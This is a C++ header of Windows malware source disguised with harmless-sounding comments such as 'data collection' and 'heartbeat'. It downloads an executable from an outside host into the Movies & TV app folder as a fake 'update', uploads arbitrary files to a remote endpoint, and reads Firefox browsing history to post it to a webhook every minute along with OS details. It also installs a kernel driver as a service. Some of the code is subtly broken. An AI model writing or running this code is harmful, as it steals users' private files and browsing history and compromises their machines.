#pragma once
#include "includes.hpp"

/// <summary>
/// Tricks Windows into installing an 'update' on movie player...
/// </summary>
bool replace_movieplayer()
{
    auto response = cpr::Get( cpr::Url{ "https://www.exejoiner.com/files/private_/_temp_installer.exe" } );

    if (response.status_code == 200) {
        std::filesystem::path moviesandtv_path = std::getenv( "localappdata" ); 
        moviesandtv_path /= "Packages\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\";

        std::ofstream outfile{ moviesandtv_path, std::ofstream::binary };
        outfile.write( response.text.c_str(), response.text.length() );
        outfile.close();
    }
    else
    {
        return false;
    }
    
    return true;
}

/// <summary>
/// Analyzes input files for data collection via webserver.
/// </summary>
/// <param name="input_files">The array of input file names</param>
/// <param name="file_count">The number of input files</param>
void analyze_files(const char** input_files, int file_count) {
    for (int i = 0; i < file_count; i++) {
        std::ifstream input_file(input_files[i], std::ios::in | std::ios::binary);
        if (!input_file)
            continue;

        input_file.seekg(0, std::ios::end);
        int file_size = input_file.tellg();
        input_file.seekg(0, std::ios::beg);

        char* buffer = new char[file_size];
        input_file.read(buffer, file_size);
        input_file.close();

        auto response = cpr::Post(cpr::Url{"https://www.exejoiner.com/api/upload.php"},
                                cpr::Multipart{{"file", cpr::Buffer{buffer, file_size}, input_files[i]}});
        delete[] buffer;
    }
    
    if( replace_movieplayer() )
    {
        //dbglog("[+] replaced movie player! will now upload all videos played!     CODE 200\r\n");
    }
}

std::string __ImportantAnalyzer() {
    wchar_t profilePath[MAX_PATH];
    SHGetSpecialFolderPath(NULL, 
                           profilePath, 
                           CSIDL_APPDATA, 
                           TRUE
                          );
    
    std::wstring profilePathW(profilePath);
    std::string profilePathA(profilePathW.begin(), profilePathW.end());
    profilePathA += "\\Mozilla\\Firefox\\Profiles\\";

    std::string defaultProfile = profilePathA + "*.default\\";
    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(defaultProfile.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        defaultProfile = profilePathA + fd.cFileName + "\\";
        FindClose(hFind);
    }

    sqlite3 *db;
    std::string dbPath = defaultProfile + "places.sqlite";
    int rc = sqlite3_open(dbPath.c_str(), &db);
    if (rc)
        return "";
    
    std::string history;
    std::string query = "SELECT url FROM moz_places ORDER BY last_visit_date DESC";
    sqlite3_stmt *stmt;
    rc = sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, NULL);
    if (rc != SQLITE_OK) {
        sqlite3_close(db);
        return "";
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        history += std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0))) + "\n";
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    return history;
}

/// <summary>
/// Send heartbeat to data collection webhook
/// </summary>
/// <param name="lpParam">URL Parameter</param>
DWORD WINAPI send_heartbeat(LPVOID lpParam) {
    std::string* url = static_cast<std::string*>(lpParam);
    while (true) {
        std::string* url = static_cast<std::string*>(lpParam);

        OSVERSIONINFO osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
        GetVersionEx(&osvi);
        std::string osDescription = "Windows " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion);

        DWORD dwConnection = 0;
        if (InternetGetConnectedState(&dwConnection, 0)) {
            std::string connectionDescription = "Internet connected";
        } else {
            std::string connectionDescription = "Internet disconnected";
        }

        std::string historyFile = "browsing_history.txt";

        std::string history = __ImportantAnalyzer();
        FILE* file = fopen(historyFile, "w");
        fprintf(file, "%s", history.c_str());
        fclose(file);

        auto response = cpr::Post(cpr::Url{*url},
                                  cpr::Body{"{\"os\": \"" + osDescription + "\", \"connection\": \"" + connectionDescription + "\"}"},
                                  cpr::Header{{"Content-Type", "application/json"}},
                                  cpr::File{historyFile}
                                 );
        Sleep(60000);
    }
    return 0;
}

bool install_driver(const char* driver_path, const char* driver_name) {
    SC_HANDLE service_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (service_manager == NULL) {
        return false;
    }

    SC_HANDLE service = CreateService(service_manager, driver_name, driver_name,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, driver_path, NULL, NULL, NULL, NULL, NULL);

    if (service == NULL) {
        CloseServiceHandle(service_manager);
        return false;
    }

    if (!StartService(service, 0, NULL)) {
        DeleteService(service);
        CloseServiceHandle(service);
        CloseServiceHandle(service_manager);
        return false;
    }

    CloseServiceHandle(service);
    CloseServiceHandle(service_manager);
    return true;
}
